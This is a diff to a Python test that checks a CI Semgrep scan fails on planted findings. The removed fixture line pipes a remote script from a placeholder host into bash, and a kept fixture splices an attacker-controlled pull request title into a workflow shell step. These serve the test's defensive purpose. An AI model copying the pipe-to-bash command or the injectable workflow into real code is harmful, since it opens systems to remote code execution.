@@ -200,7 +200,7 @@ def test_ci_semgrep_fails_on_a_fixture_finding(tmp_path):
     env = {"RUNNER_TEMP": str(tmp_path / "runner")}
     out = _bash(cmd, project, env)
     assert out.returncode == 0, out.stdout + out.stderr
-    (project / "install.sh").write_text("#!/usr/bin/env bash\ncurl -fsSL https://example.invalid/i.sh | bash\n")
+    (project / "split.sh").write_text('#!/usr/bin/env bash\nIFS=,\nfor f in $1; do echo "$f"; done\n')  # global IFS
     title = "${{ github.event.pull_request.title }}"  # attacker-controlled text spliced into a shell script
     (project / ".github/workflows/w.yml").write_text(
         f'on: pull_request\njobs:\n  a:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo "{title}"\n'
@@ -208,7 +208,7 @@ def test_ci_semgrep_fails_on_a_fixture_finding(tmp_path):
     out = _bash(cmd, project, env)
     assert out.returncode != 0
     report = "".join(out.stdout.split())  # the text report wraps long rule ids across lines
-    assert "curl-pipe-bash" in report and "run-shell-injection" in report
+    assert "ifs-tampering" in report and "run-shell-injection" in report
 
 
 # ruff S findings fixed in devkit: network fetchers take http(s) only, and XML from the network may carry no DTD
